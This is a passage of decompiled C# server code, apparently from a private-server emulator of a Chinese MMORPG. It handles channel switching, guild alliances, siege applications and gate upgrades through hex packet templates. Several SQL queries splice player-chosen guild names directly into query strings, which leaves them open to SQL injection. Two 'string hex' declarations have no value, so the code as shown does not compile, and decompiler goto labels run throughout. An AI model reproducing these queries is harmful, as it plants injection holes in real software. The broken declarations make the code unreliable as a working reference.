			if (商店ID_ == 1 || 商店ID_ == 14 || 商店ID_ == 18 || 商店ID_ == 41 || 商店ID_ == 93 || 商店ID_ == 11 || 商店ID_ == 23 || 商店ID_ == 43 || 商店ID_ == 108 || 商店ID_ == 37 || 商店ID_ == 86)
			{
				保存个人仓库存储过程();
				保存综合仓库存储过程();
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array3, array3.Length);
			}
		}

		public void 天魔换线移动(float x, float y, float z, int Tomap)
		{
			try
			{
				if (!base.Player死亡 && !退出中 && (个人商店 == null || !个人商店.个人商店是否开启) && (交易 == null || 交易.交易人 == null))
				{
					if (自动攻击 != null)
					{
						自动攻击.Stop();
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					if (自动恢复 != null)
					{
						自动恢复.Enabled = false;
						自动恢复.Close();
						自动恢复.Dispose();
						自动恢复 = null;
					}
					if (base.人物坐标_地图 == 41001)
					{
						发送仙魔大战关闭消息();
					}
					int 人物坐标_地图 = base.人物坐标_地图;
					移动离开当前地图(Tomap);
					byte[] array = Converter.hexStringToByte("AA5522005C0079001C00000000000060D1C5000070410000D0412D010000000000000000000055AA");
					base.人物坐标_X = x;
					base.人物坐标_Y = y;
					base.人物坐标_Z = z;
					base.人物坐标_地图 = Tomap;
					移动中目标坐标X = x;
					移动中目标坐标Y = y;
					移动时间 = DateTime.Now;
					if (人物灵兽 != null)
					{
						人物灵兽.人物坐标_X = x;
						人物灵兽.人物坐标_Z = z;
						人物灵兽.人物坐标_Y = y;
						人物灵兽.人物坐标_MAP = Tomap;
					}
					上次坐标X = x;
					上次坐标Y = y;
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					if (Tomap == 101)
					{
						换线(base.原服务器ID, base.原服务器IP, base.原服务器端口);
					}
					else
					{
						换线(base.原服务器ID, base.银币广场服务器IP, base.银币广场服务器端口);
					}
					SavePlayerData();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "换线移动 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 换线移动(float x, float y, float z, int Tomap)
		{
			try
			{
				if (自动攻击 != null)
				{
					自动攻击.Stop();
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				if (base.人物坐标_地图 == 41001)
				{
					发送仙魔大战关闭消息();
				}
				if (base.人物坐标_地图 == 801)
				{
					势力战系统.发送势力战关闭消息旧(this);
				}
				int 人物坐标_地图 = base.人物坐标_地图;
				移动离开当前地图(Tomap);
				怪物攻击列表.Clear();
				byte[] array = Converter.hexStringToByte("AA5522005C0079001C00000000000060D1C5000070410000D0412D010000000000000000000055AA");
				base.人物坐标_X = x;
				base.人物坐标_Y = y;
				base.人物坐标_Z = z;
				base.人物坐标_地图 = Tomap;
				移动中目标坐标X = x;
				移动中目标坐标Y = y;
				移动时间 = DateTime.Now;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (Tomap == 101)
				{
					换线(base.原服务器ID, base.原服务器IP, base.原服务器端口);
				}
				else
				{
					换线(base.原服务器ID, base.银币广场服务器IP, base.银币广场服务器端口);
				}
				SavePlayerData();
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "换线移动 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 清空辅助状态()
		{
			try
			{
				foreach (int key in 追加状态列表.Keys)
				{
					if (World.TBL_KONGFU.TryGetValue(key, out var value) && value.FLD_武功类型 == 1)
					{
						追加状态列表[key].时间结束事件();
					}
				}
			}
			catch
			{
			}
		}

		public bool 检查公有药品()
		{
			bool result = false;
			if (公有药品.ContainsKey(1008000027) || 公有药品.ContainsKey(1008000028) || 公有药品.ContainsKey(1008000029) || 公有药品.ContainsKey(1008000058) || 公有药品.ContainsKey(1008000059) || 公有药品.ContainsKey(1008000060) || 公有药品.ContainsKey(1008000312) || 公有药品.ContainsKey(1008000311))
			{
				result = true;
			}
			return result;
		}

		public void 换线(int 服务器ID, string IP, int port)
		{
			try
			{
				清空辅助状态();
				base.Client.在线 = false;
				base.Client.换线中 = true;
				int value = 0;
				DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [TBL_XWWL_Char] where FLD_NAME=@Userid", new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.UserName) });
				if (dBToDataTable != null)
				{
					value = (int)dBToDataTable.Rows[0]["FLD_INDEX"];
					dBToDataTable.Dispose();
					goto IL_00ee;
				}
				if (base.Client == null)
				{
					goto IL_00ee;
				}
				kickidlog("换线()获取人物出错");
				MainForm.WriteLine(1, "获取人物出错，[" + base.Userid + "][" + base.UserName + "]");
				OpClient(1);
				base.Client.Dispose();
				goto end_IL_0001;
				IL_00ee:
				byte[] array = Converter.hexStringToByte("AA550600E7035015000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				byte[] array2 = Converter.hexStringToByte("AA552E00E703D20028000100000000000000000000000000000000000000000000003200000000000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(服务器ID), 0, array2, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array2, 18, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(port), 0, array2, 30, 4);
				byte[] bytes = Encoding.Default.GetBytes(IP);
				Buffer.BlockCopy(bytes, 0, array2, 34, bytes.Length);
				World.conn.发送("用户换线通知|" + base.Userid + "|" + 判断是否用封包登陆);
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
				SavePlayerData();
				MainForm.WriteLine(1, "用户换线通知|" + base.Userid + "|" + 判断是否用封包登陆);
				end_IL_0001:;
			}
			catch
			{
			}
		}

		public int 得到最高武功()
		{
			int result = 0;
			int num = 0;
			for (int i = 0; i < 32; i++)
			{
				武功类 武功类2 = 武功新[0, i];
				if (武功类2 != null && 武功类2.FLD_AT > num)
				{
					result = 武功类2.FLD_PID;
				}
			}
			for (int j = 0; j < 32; j++)
			{
				武功类 武功类3 = 武功新[3, j];
				if (武功类3 != null && 武功类3.FLD_AT > num)
				{
					result = 武功类3.FLD_PID;
				}
			}
			if (base.Player_Level < 115)
			{
				switch (base.Player_Job)
				{
				case 1:
					result = 100301;
					break;
				case 2:
					result = 200301;
					break;
				case 3:
					result = 300301;
					break;
				case 4:
					result = 400301;
					break;
				case 5:
					result = 500301;
					break;
				case 6:
					result = 800301;
					break;
				case 7:
					result = 900301;
					break;
				case 8:
					result = 1000301;
					break;
				case 9:
					result = 2000301;
					break;
				case 10:
					result = 3000301;
					break;
				case 11:
					result = 4000301;
					break;
				case 12:
					result = 5000301;
					break;
				case 13:
					result = 6000301;
					break;
				}
			}
			return result;
		}

		public void 发送攻城相关BUFF(bool 是否消失)
		{
			string hex = "AA553200210043012C0000000000000000007AE4143C0000000070000100585D94770000000001000000E84B9377000000000100000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			uint value = uint.Parse(DateTime.Now.ToString("yyMMddHHmm"));
			uint value2 = uint.Parse(DateTime.Now.AddDays(7.0).ToString("yyMMddHHmm"));
			if (是否消失)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(-1), 0, array, 30, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 38, 4);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array, 30, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 42, 4);
				if (base.帮派名字 != base.门派联盟盟主 || base.帮派人物等级 != 6)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 50, 4);
				}
			}
			if (base.门派联盟盟主.Length > 0 && base.门派联盟盟主 == World.天魔神宫占领者)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1008002169), 0, array, 18, 4);
				if (追加状态列表.ContainsKey(1008002169))
				{
					追加状态列表[1008002169].时间结束事件();
				}
				if (追加状态列表.ContainsKey(1008002170))
				{
					追加状态列表[1008002170].时间结束事件();
				}
				if (!追加状态列表.ContainsKey(1008002169))
				{
					int 时间 = 604800000;
					追加状态类 value3 = new 追加状态类(this, 时间, 1008002169, 0);
					追加状态列表.Add(1008002169, value3);
				}
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1008002170), 0, array, 18, 4);
				if (追加状态列表.ContainsKey(1008002169))
				{
					追加状态列表[1008002169].时间结束事件();
				}
				if (追加状态列表.ContainsKey(1008002170))
				{
					追加状态列表[1008002170].时间结束事件();
				}
				if (!追加状态列表.ContainsKey(1008002170))
				{
					int 时间2 = 604800000;
					追加状态类 value4 = new 追加状态类(this, 时间2, 1008002170, 0);
					追加状态列表.Add(1008002170, value4);
				}
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public static void 发送攻城相关BUFF(Players players, int BUFFID, DateTime 到期时间, bool 是否消失)
		{
			string hex = "AA5532001F0443012C0000000000000000008FE4143C00000000700000003C00000000000000010000008EE69377000000000000000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			uint value = uint.Parse(到期时间.ToString("yyMMddHHmm"));
			uint value2 = (uint)到期时间.Subtract(DateTime.Now).TotalSeconds;
			if (是否消失)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(-1), 0, array, 30, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 38, 4);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array, 30, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 42, 4);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(BUFFID), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 4, 2);
			if (players.Client != null)
			{
				players.Client.Send(array, array.Length);
			}
		}

		public void 向周围玩家发送我的攻城中图标()
		{
			if (base.人物坐标_地图 != 42001)
			{
				return;
			}
			string hex = "AA552B00660108512500010000006601000002000000000000000000000100000000D60B360000000000D60B36000155AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 29, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.帮派Id), 0, array, 34, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.帮派Id), 0, array, 42, 4);
			if (base.门派联盟盟主 == World.天魔神宫占领者)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 18, 4);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 18, 4);
			}
			if (base.帮派人物等级 == 6)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 46, 1);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 46, 1);
			}
			if (追加状态列表.ContainsKey(1008002192))
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 29, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(base.帮派Id), 0, array, 34, 4);
			}
			List<Players> list = 获取范围玩家(300);
			foreach (Players item in list)
			{
				if (item != null)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(item.人物全服ID), 0, array, 4, 2);
					if (item.Client != null)
					{
						item.Client.Send(array, array.Length);
					}
				}
			}
		}

		public List<Players> 获取范围玩家(int 获取范围)
		{
			List<Players> list = new List<Players>();
			foreach (Players value in World.AllConnectedPlayers.Values)
			{
				if (玩家是否在指定范围内(获取范围, value))
				{
					list.Add(value);
				}
			}
			return list;
		}

		public void 取消攻城申请(byte[] 封包数据, int 封包长度)
		{
			if (base.帮派人物等级 != 6)
			{
				return;
			}
			if (base.门派联盟盟主.Length > 0)
			{
				if (base.帮派名字 != base.门派联盟盟主)
				{
					return;
				}
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					if (value.门派联盟盟主 == base.门派联盟盟主)
					{
						value.发送攻城相关BUFF(是否消失: true);
						value.宣告攻城 = 0;
					}
				}
				DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [TBL_XWWL_Guild] where 联盟盟主='" + base.门派联盟盟主 + "'");
				if (dBToDataTable != null)
				{
					if (dBToDataTable.Rows.Count == 1)
					{
						RxjhClass.更新门派联盟盟主(base.门派联盟盟主, "", 0);
						base.门派联盟盟主 = "";
					}
					else
					{
						RxjhClass.更新联盟宣告攻城状态(base.门派联盟盟主, 0);
					}
					dBToDataTable.Dispose();
				}
			}
			else
			{
				RxjhClass.更新门派联盟盟主(base.帮派名字, "", 0);
				foreach (Players value2 in World.AllConnectedPlayers.Values)
				{
					if (value2.帮派名字 == base.帮派名字)
					{
						value2.发送攻城相关BUFF(是否消失: true);
						value2.宣告攻城 = 0;
					}
				}
			}
			string hex = "AA5522002100D6041C0007000000BDADBAFEB5DAD2BBB4F3B0EF00000000020000000100000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public static void 查看城门强化信息(byte[] 封包数据, Players players)
		{
			string hex = "AA551A00B003D90414000700000005000000A0252600F40100000100000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(World.城门强化等级), 0, array, 14, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(World.城门强化等级 * 250000), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(World.城门强化等级 * 50), 0, array, 22, 4);
			if (players.Client != null)
			{
				players.Client.Send(array, array.Length);
			}
		}

		public static void 城门强化确认(byte[] 封包数据, Players players)
		{
			string hex = "AA551A00B003DB041400070000000000000000000000000000000100000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 4, 2);
			if (players.Player_Money < 50000000)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(10138), 0, array, 26, 4);
				players.系统提示("金币不足，你的金币不足5000万！", 9, "系统提示");
			}
			else if (players.Player_Whtb < 10000)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(10236), 0, array, 26, 4);
				players.系统提示("武皇币不足，你的武皇币不足10000 请用武勋!兑换武皇币！", 9, "系统提示");
			}
			else
			{
				players.Player_Money -= 50000000L;
				players.Player_Whtb -= 10000;
				World.城门强化等级++;
				players.游戏币消耗提示(50000000u, -1);
				players.更新武功和状态();
				players.更新金钱和负重();
				players.系统提示("强化城门成功，当前城门强化等级：[" + World.城门强化等级 + "]级！", 10, "系统提示");
			}
			if (players.Client != null)
			{
				players.Client.Send(array, array.Length);
			}
		}

		public void 游戏币消耗提示(uint 数量, int 增减)
		{
			string hex = "AA551200B00381030C001B000000001F0AFAFFFFFFFF55AA";
			byte[] array = Converter.hexStringToByte(hex);
			if (增减 == -1)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(0L - (long)数量), 0, array, 14, 4);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 14, 4);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(增减), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 查看同盟门派信息(byte[] 封包数据, int 封包长度)
		{
			string hex
			byte[] array = Converter.hexStringToByte(hex);
			DataTable dataTable = RxjhClass.取得门派联盟列表(World.天魔神宫占领者);
			if (dataTable != null)
			{
				int num = 0;
				for (int i = 0; i < dataTable.Rows.Count; i++)
				{
					string text = dataTable.Rows[i]["G_Name"].ToString();
					if (text != World.天魔神宫占领者)
					{
						byte[] bytes = Encoding.Default.GetBytes(text);
						Buffer.BlockCopy(bytes, 0, array, 18 + 24 * num, bytes.Length);
						num++;
					}
				}
			}
			Buffer.BlockCopy(BitConverter.GetBytes(3), 0, array, 270, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 查看同盟申请门派信息(byte[] 封包数据, int 封包长度)
		{
			byte[] array = new byte[20];
			for (int i = 0; i < 20 && 封包数据[i + 10] != 0; i++)
			{
				array[i] = 封包数据[i + 10];
			}
			string name = Encoding.Default.GetString(array).Replace("\0", "");
			DataTable dataTable = RxjhClass.得到帮派数据(name);
			string hex = "AA552D000400C8042700B9000000000000000000000000000000D70000000000000000000000000000010000000100000055AA";
			byte[] array2 = Converter.hexStringToByte(hex);
			if (dataTable != null)
			{
				byte[] array3 = new byte[20];
				array3 = Encoding.Default.GetBytes(dataTable.Rows[0]["G_Name"].ToString());
				Buffer.BlockCopy(array3, 0, array2, 10, array3.Length);
				array3 = Encoding.Default.GetBytes(dataTable.Rows[0]["G_Master"].ToString());
				Buffer.BlockCopy(array3, 0, array2, 26, array3.Length);
				Buffer.BlockCopy(BitConverter.GetBytes((int)dataTable.Rows[0]["Leve"]), 0, array2, 45, 4);
				dataTable.Dispose();
				dataTable = RxjhClass.得到帮派人数(name);
				Buffer.BlockCopy(BitConverter.GetBytes(dataTable.Rows.Count), 0, array2, 41, 4);
				dataTable.Dispose();
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 同盟管理(byte[] 封包数据, int 封包长度)
		{
			string hex = "AA550E010400C604080107000000330000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000008904000001000000010000000100000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			DataTable dataTable = RxjhClass.取得门派联盟列表(base.帮派名字);
			int num = 0;
			if (dataTable != null)
			{
				for (int i = 0; i < dataTable.Rows.Count; i++)
				{
					string text = dataTable.Rows[i]["G_Name"].ToString();
					if (text != base.帮派名字)
					{
						byte[] bytes = Encoding.Default.GetBytes(text);
						Buffer.BlockCopy(bytes, 0, array, 18 + 24 * num, bytes.Length);
						Buffer.BlockCopy(BitConverter.GetBytes(3), 0, array, 34 + 24 * num, 4);
						num++;
					}
				}
			}
			for (int j = 0; j < World.门派联盟申请状态.Count; j++)
			{
				门派联盟申请状态 门派联盟申请状态2 = World.门派联盟申请状态[j];
				if (门派联盟申请状态2.盟主门派名字 == base.帮派名字)
				{
					byte[] bytes2 = Encoding.Default.GetBytes(门派联盟申请状态2.申请门派名字);
					Buffer.BlockCopy(bytes2, 0, array, 18 + 24 * (j + num), bytes2.Length);
				}
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 回应其它门派的同盟申请(byte[] 封包数据, int 封包长度)
		{
			byte[] array = new byte[20];
			for (int i = 0; i < 20 && 封包数据[i + 14] != 0; i++)
			{
				array[i] = 封包数据[i + 14];
			}
			string text = Encoding.Default.GetString(array).Replace("\0", "");
			switch (封包数据[30])
			{
			case 1:
			{
				for (int k = 0; k < World.门派联盟申请状态.Count; k++)
				{
					门派联盟申请状态 门派联盟申请状态3 = World.门派联盟申请状态[k];
					if (!(门派联盟申请状态3.申请门派名字 == text) || !(门派联盟申请状态3.盟主门派名字 == base.帮派名字))
					{
						continue;
					}
					World.门派联盟申请状态.RemoveAt(k);
					RxjhClass.更新门派联盟盟主(门派联盟申请状态3.申请门派名字, 门派联盟申请状态3.盟主门派名字, base.宣告攻城);
					foreach (Players value in World.AllConnectedPlayers.Values)
					{
						if (value.帮派名字 == text)
						{
							value.门派联盟盟主 = 门派联盟申请状态3.盟主门派名字;
							if (value.门派联盟盟主 == World.天魔神宫占领者)
							{
								value.发送攻城相关BUFF(是否消失: false);
							}
							else
							{
								value.发送攻城相关BUFF(是否消失: false);
							}
						}
					}
					break;
				}
				break;
			}
			case 2:
			{
				if (base.帮派名字 == base.门派联盟盟主)
				{
					RxjhClass.更新门派联盟盟主(text, "", 0);
					foreach (Players value2 in World.AllConnectedPlayers.Values)
					{
						if (value2.帮派名字 == text)
						{
							value2.门派联盟盟主 = "";
							value2.发送攻城相关BUFF(是否消失: true);
							value2.宣告攻城 = 0;
						}
					}
					break;
				}
				if (base.门派联盟盟主 != "")
				{
					RxjhClass.更新门派联盟盟主(base.帮派名字, "", 0);
					foreach (Players value3 in World.AllConnectedPlayers.Values)
					{
						if (value3.帮派名字 == base.帮派名字)
						{
							value3.门派联盟盟主 = "";
							value3.发送攻城相关BUFF(是否消失: true);
							value3.宣告攻城 = 0;
						}
					}
					break;
				}
				for (int j = 0; j < World.门派联盟申请状态.Count; j++)
				{
					门派联盟申请状态 门派联盟申请状态2 = World.门派联盟申请状态[j];
					if (门派联盟申请状态2.申请门派名字 == base.帮派名字 && 门派联盟申请状态2.盟主门派名字 == text)
					{
						World.门派联盟申请状态.RemoveAt(j);
						break;
					}
				}
				break;
			}
			}
			string hex = "AA5522000400C4041C000700000000000000000000000000000000000000010000000100000055AA";
			byte[] array2 = Converter.hexStringToByte(hex);
			byte[] bytes = Encoding.Default.GetBytes(text);
			Buffer.BlockCopy(bytes, 0, array2, 14, bytes.Length);
			array2[30] = 封包数据[30];
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 查看天魔神宫占领信息(byte[] 封包数据, int 封包长度)
		{
			int year = World.天魔神宫占领时间.ToUniversalTime().Year;
			int month = World.天魔神宫占领时间.ToUniversalTime().Month;
			int day = World.天魔神宫占领时间.ToUniversalTime().Day;
			int value = year * 1000 + month * 100 + day;
			int year2 = World.天魔神宫奖励时间.ToUniversalTime().Year;
			int month2 = World.天魔神宫奖励时间.ToUniversalTime().Month;
			int day2 = World.天魔神宫奖励时间.ToUniversalTime().Day;
			int value2 = year2 * 1000 + month2 * 100 + day2;
			string hex = "AA552E001000C2042800070000001500000000000000000000000000000000000000A53C340100000000030000007F3D340155AA";
			byte[] array = Converter.hexStringToByte(hex);
			byte[] bytes = Encoding.Default.GetBytes(World.天魔神宫占领者);
			Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 34, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array, 46, 4);
			if (base.门派联盟盟主 == "")
			{
				if (World.查询门派向哪个门派发出联盟申请(base.帮派名字) == World.天魔神宫占领者)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 42, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 42, 4);
				}
			}
			else if (base.门派联盟盟主 == World.天魔神宫占领者)
			{
				if (base.帮派名字 == base.门派联盟盟主)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(51), 0, array, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 42, 4);
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(21), 0, array, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(3), 0, array, 42, 4);
				}
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(51), 0, array, 14, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 42, 4);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 同盟申请(byte[] 封包数据, int 封包长度)
		{
			string hex = "AA5522001000C0041C0007000000B4000000000000000000000000000000010000000100000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			byte[] array2 = new byte[20];
			for (int i = 0; i < 20 && 封包数据[i + 14] != 0; i++)
			{
				array[i + 14] = 封包数据[i + 14];
				array2[i] = 封包数据[i + 14];
			}
			string 盟主门派 = Encoding.Default.GetString(array2).Replace("\0", "");
			申请门派联盟(盟主门派);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 查看攻城同盟列表(byte[] 封包数据, int 封包长度)
		{
			int num = 封包数据[22];
			string hex
			byte[] array = Converter.hexStringToByte(hex);
			DataTable dataTable = RxjhClass.得到已申请攻城的门派列表();
			base.门派联盟盟主 = RxjhClass.取得门派联盟盟主(base.帮派名字);
			if (dataTable != null && dataTable.Rows.Count > num * 10 - 10)
			{
				int num2 = 0;
				for (int i = 0; i < dataTable.Rows.Count; i++)
				{
					string text = dataTable.Rows[num * 10 - 10 + i]["G_Name"].ToString();
					if (text != World.天魔神宫占领者)
					{
						byte[] bytes = Encoding.Default.GetBytes(text);
						Buffer.BlockCopy(BitConverter.GetBytes(51), 0, array, 14 + 24 * num2, 4);
						Buffer.BlockCopy(bytes, 0, array, 18 + 24 * num2, bytes.Length);
						if (text == base.门派联盟盟主)
						{
							Buffer.BlockCopy(BitConverter.GetBytes(3), 0, array, 34 + 24 * num2, 4);
							Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 270, 4);
						}
						else if (text == World.查询门派向哪个门派发出联盟申请(base.帮派名字))
						{
							Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 34 + 24 * num2, 4);
							Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 270, 4);
						}
						else
						{
							Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 34 + 24 * num2, 4);
						}
						num2++;
					}
				}
				Buffer.BlockCopy(BitConverter.GetBytes(num), 0, array, 262, 4);
				Buffer.BlockCopy(BitConverter.GetBytes(num2 / 10 + 1), 0, array, 266, 4);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 申请攻城(byte[] 封包数据, int 封包长度)
		{
			try
			{
				if (base.宣告攻城 == 1)
				{
					系统提示("已申请攻城的门派不能重复申请");
					return;
				}
				if (base.帮派人物等级 != 6)
				{
					系统提示("只有门主可以申请攻城");
					return;
				}
				if (base.门派联盟盟主 != "")
				{
					if (base.门派联盟盟主 != base.帮派名字)
					{
						系统提示("只有门派联盟的盟主可以宣告攻城");
						return;
					}
					RxjhClass.更新联盟宣告攻城状态(base.帮派名字, 1);
					foreach (Players value in World.AllConnectedPlayers.Values)
					{
						if (value.门派联盟盟主 == base.门派联盟盟主)
						{
							value.门派联盟盟主 = base.门派联盟盟主;
							value.宣告攻城 = 1;
							value.发送攻城相关BUFF(是否消失: false);
						}
					}
					goto IL_0191;
				}
				RxjhClass.更新门派联盟盟主(base.帮派名字, base.帮派名字, 1);
				foreach (Players value2 in World.AllConnectedPlayers.Values)
				{
					if (value2.帮派名字 == base.帮派名字)
					{
						value2.宣告攻城 = 1;
						value2.门派联盟盟主 = base.帮派名字;
						value2.发送攻城相关BUFF(是否消失: false);
					}
				}
				goto IL_0191;
				IL_0191:
				DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [攻城城主] where 分区信息= '" + World.ZoneNumber + "'");
				if (dBToDataTable == null || dBToDataTable.Rows.Count == 0)
				{
					int year = DateTime.Now.ToUniversalTime().Year;
					int month = DateTime.Now.ToUniversalTime().Month;
					int day = DateTime.Now.ToUniversalTime().Day;
					int num = year * 1000 + month * 100 + day;
					DataTable dBToDataTable2 = DBA.GetDBToDataTable("select * from [TBL_XWWL_Guild] where G_Name='" + base.帮派名字 + "'");
					DBA.ExeSqlCommand(string.Format("INSERT INTO 攻城城主 (城主名字, 攻城行会名, 帮派ID, 分区信息)values('{0}','{1}', {2}, '{3}')", dBToDataTable2.Rows[0]["G_Master"].ToString(), base.帮派名字, base.帮派Id, World.ZoneNumber));
					dBToDataTable2.Dispose();
				}
				dBToDataTable.Dispose();
				string hex = "AA5512000400BC040C0007000000020000000100000055AA";
